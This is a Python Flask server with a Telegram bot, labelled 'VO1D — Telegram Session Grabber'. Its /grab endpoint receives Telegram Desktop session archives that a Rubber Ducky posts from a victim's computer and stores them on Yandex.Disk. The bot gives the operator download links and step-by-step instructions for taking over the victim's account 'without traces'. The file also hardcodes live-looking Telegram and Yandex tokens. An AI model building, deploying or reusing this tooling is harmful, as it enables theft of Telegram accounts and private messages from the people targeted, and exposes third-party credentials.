from flask import Flask, request, jsonify
import json
import os
from datetime import datetime
import requests

app = Flask(__name__)

# ============================================================
# ТОКЕН БОТА
# ============================================================
TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

# ============================================================
# ТОКЕН ЯНДЕКС.ДИСКА
# ============================================================
YANDEX_TOKEN = "y0__wgBEIeRtIEJGNuWAyDAj-LOGGtaBiLfE7TenenIpgXVOd0Rlgkp"

# ============================================================
# ОТПРАВКА СООБЩЕНИЙ
# ============================================================
def send_message(chat_id, text, keyboard=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        payload["reply_markup"] = json.dumps(keyboard)
    requests.post(url, json=payload)

# ============================================================
# КЛАВИАТУРА
# ============================================================
def get_keyboard():
    return {
        "keyboard": [
            ["📥 Получить ссылку", "📊 Мои сессии"],
            ["📖 Инструкция", "🗑️ Очистить всё"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

# ============================================================
# ОБРАБОТКА СООБЩЕНИЙ
# ============================================================
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data or "message" not in data:
        return "OK", 200
    
    chat_id = data["message"]["chat"]["id"]
    text = data["message"].get("text", "")
    
    if text == "/start":
        send_message(
            chat_id,
            "🖤 **VO1D — Telegram Session Grabber**\n\n"
            "Сессии сохраняются на Яндекс.Диск.\n"
            "Просто вставь флешку в компьютер жертвы.\n\n"
            "Выбери действие:",
            get_keyboard()
        )
    
    elif text == "📥 Получить ссылку":
        link = get_latest_link()
        if not link:
            send_message(chat_id, "📭 **Нет сессий**")
        else:
            send_message(chat_id, f"🔗 **Ссылка на сессию:**\n\n{link}")
    
    elif text == "📊 Мои сессии":
        files = get_logs()
        if not files:
            send_message(chat_id, "📭 **Нет сессий**")
        else:
            msg = "📊 **Твои сессии:**\n\n"
            for f in files:
                msg += f"📄 `{f}`\n"
            send_message(chat_id, msg)
    
    elif text == "📖 Инструкция":
        send_message(
            chat_id,
            "📖 **ИНСТРУКЦИЯ**\n\n"
            "1️⃣ Вставь Rubber Ducky в ПК жертвы\n"
            "2️⃣ Скрипт скопирует Telegram сессию\n"
            "3️⃣ Сессия загружается на Яндекс.Диск\n"
            "4️⃣ Нажми '📥 Получить ссылку' — получишь прямую ссылку\n"
            "5️⃣ Скачай архив и распакуй\n"
            "6️⃣ Замени папку `%AppData%\\Telegram Desktop\\tdata`\n"
            "7️⃣ Запусти Telegram — ты в чужом аккаунте!\n\n"
            "⚡ **VO1D — тихо, быстро, без следов.**"
        )
    
    elif text == "🗑️ Очистить всё":
        clear_yandex_disk()
        send_message(chat_id, "✅ **Все сессии удалены**")
    
    else:
        send_message(chat_id, "❓ Используй кнопки.", get_keyboard())
    
    return "OK", 200

# ============================================================
# РАБОТА С ЯНДЕКС.ДИСКОМ
# ============================================================
def get_latest_link():
    try:
        # Получаем список файлов на Яндекс.Диске
        url = "https://cloud-api.yandex.net/v1/disk/resources/files?limit=1&media_type=compressed"
        resp = requests.get(url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
        if resp.status_code != 200:
            return None
        data = resp.json()
        if not data.get("items"):
            return None
        path = data["items"][0]["path"]
        # Получаем публичную ссылку
        pub_url = "https://cloud-api.yandex.net/v1/disk/resources/publish"
        resp = requests.put(pub_url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"}, params={"path": path})
        if resp.status_code != 200:
            return None
        link = resp.json().get("href")
        return link
    except:
        return None

def get_logs():
    try:
        url = "https://cloud-api.yandex.net/v1/disk/resources/files?media_type=compressed"
        resp = requests.get(url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
        if resp.status_code != 200:
            return []
        data = resp.json()
        return [item["name"] for item in data.get("items", [])]
    except:
        return []

def clear_yandex_disk():
    try:
        url = "https://cloud-api.yandex.net/v1/disk/resources/files?media_type=compressed"
        resp = requests.get(url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
        if resp.status_code != 200:
            return
        for item in resp.json().get("items", []):
            delete_url = f"https://cloud-api.yandex.net/v1/disk/resources?path={item['path']}"
            requests.delete(delete_url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"})
    except:
        pass

# ============================================================
# ПРИНИМАЕТ POST ОТ RUBBER DUCKY
# ============================================================
@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400

        # Если пришла Base64 строка
        if "telegram" in data and data["telegram"]:
            import base64
            b64_data = data["telegram"]
            # Декодируем Base64 в ZIP
            zip_data = base64.b64decode(b64_data)
            
            # Загружаем на Яндекс.Диск
            name = f"tg_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            upload_url = "https://cloud-api.yandex.net/v1/disk/resources/upload"
            resp = requests.get(upload_url, headers={"Authorization": f"OAuth {YANDEX_TOKEN}"}, params={"path": name, "overwrite": True})
            if resp.status_code != 200:
                return jsonify({"error": "Yandex upload failed"}), 500
            upload_href = resp.json()["href"]
            requests.put(upload_href, data=zip_data, headers={"Content-Type": "application/zip"})
            
            print(f"[+] Saved TG session: {name}")
            return jsonify({"status": "OK", "file": name}), 200
        else:
            return jsonify({"error": "No telegram data"}), 400

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 500

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
